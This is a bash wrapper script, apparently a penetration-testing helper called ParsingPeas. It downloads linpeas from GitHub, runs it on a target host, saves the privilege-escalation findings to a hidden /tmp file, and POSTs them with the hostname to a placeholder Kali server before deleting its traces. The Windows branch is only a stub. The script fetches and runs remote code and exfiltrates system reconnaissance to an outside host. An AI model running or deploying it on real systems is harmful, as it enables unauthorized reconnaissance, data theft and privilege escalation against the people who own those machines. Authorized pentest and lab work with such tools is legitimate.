#!/bin/bash
#
# ParsingPeas Wrapper Script
# Runs linpeas/winpeas and automatically sends output to Kali host
#

SERVER_URL="KALI_SERVER_URL"  # Will be replaced by receiver.py
SESSION_ID="scan_$(date +%s)_$$"
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
TMP_OUTPUT="/tmp/.linpeas_$(date +%s).tmp"

echo "[*] ParsingPeas - Automated Privilege Escalation Scanner"
echo "[*] Session ID: $SESSION_ID"
echo "[*] Hostname: $HOSTNAME"
echo ""

# Detect OS
if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]]; then
    SCAN_TYPE="linpeas"
    echo "[*] Detected: Linux/Unix system"
    SCRIPT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
else
    SCAN_TYPE="winpeas"
    echo "[*] Detected: Windows system"
    SCRIPT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
fi

# Check for curl
if ! command -v curl &> /dev/null; then
    echo "[!] Error: curl not found. Trying wget..."
    if ! command -v wget &> /dev/null; then
        echo "[!] Error: Neither curl nor wget available. Exiting."
        exit 1
    fi
    USE_WGET=1
fi

echo "[*] Downloading $SCAN_TYPE..."

# Download and run linpeas
if [[ $SCAN_TYPE == "linpeas" ]]; then
    # Download linpeas
    if [[ $USE_WGET ]]; then
        wget -q -O /tmp/linpeas.sh "$SCRIPT_URL" || { echo "[!] Download failed"; exit 1; }
    else
        curl -sSL "$SCRIPT_URL" -o /tmp/linpeas.sh || { echo "[!] Download failed"; exit 1; }
    fi
    
    chmod +x /tmp/linpeas.sh
    
    echo "[*] Running linpeas (this may take a few minutes)..."
    echo ""
    
    # Run linpeas and save output
    /tmp/linpeas.sh 2>&1 | tee "$TMP_OUTPUT"
    
    # Check if output was generated
    if [[ ! -f "$TMP_OUTPUT" ]] || [[ ! -s "$TMP_OUTPUT" ]]; then
        echo "[!] Error: No output generated"
        exit 1
    fi
    
    OUTPUT_SIZE=$(stat -f%z "$TMP_OUTPUT" 2>/dev/null || stat -c%s "$TMP_OUTPUT" 2>/dev/null)
    echo ""
    echo "[*] Scan complete. Output size: $((OUTPUT_SIZE / 1024)) KB"
    echo "[*] Transferring to Kali host..."
    
    # Send to Kali with retry logic
    MAX_RETRIES=3
    RETRY_COUNT=0
    
    while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
        if curl -X POST \
            -H "X-Session-ID: $SESSION_ID" \
            -H "X-Hostname: $HOSTNAME" \
            -H "X-Scan-Type: $SCAN_TYPE" \
            -H "Content-Type: text/plain" \
            --data-binary "@$TMP_OUTPUT" \
            --max-time 300 \
            "$SERVER_URL/upload" 2>&1 | grep -q '"status":"success"'; then
            
            echo "[+] Transfer successful!"
            echo "[+] Cleaning up..."
            rm -f /tmp/linpeas.sh "$TMP_OUTPUT"
            echo "[+] Done! Check your Kali host for the HTML report."
            exit 0
        else
            RETRY_COUNT=$((RETRY_COUNT + 1))
            echo "[!] Transfer failed (attempt $RETRY_COUNT/$MAX_RETRIES)"
            if [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; then
                echo "[*] Retrying in 2 seconds..."
                sleep 2
            fi
        fi
    done
    
    echo "[!] Transfer failed after $MAX_RETRIES attempts"
    echo "[*] Output saved locally at: $TMP_OUTPUT"
    exit 1
fi

echo "[!] Windows support coming soon!"
exit 1
